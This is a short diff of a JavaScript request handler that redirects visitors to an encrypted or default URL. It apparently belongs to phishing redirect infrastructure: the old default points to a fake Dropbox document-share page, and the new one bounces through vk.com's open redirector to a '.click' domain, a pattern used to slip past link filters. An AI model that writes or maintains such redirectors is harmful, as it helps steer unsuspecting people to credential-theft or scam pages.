@@ -3,7 +3,7 @@ module.exports = (req, res) => {
     const encryptedUrl = req.query.url;
 
     // Default link to redirect to (in case no URL is provided)
-    const defaultUrl = 'https://itstartedintanzania.com/pdfcontent/dropbox-document-share.html';
+    const defaultUrl = 'https://vk.com/away.php?to=https://check.valei.click/9?ai=xd';
 
     // If the 'url' query parameter is provided
     if (encryptedUrl) {
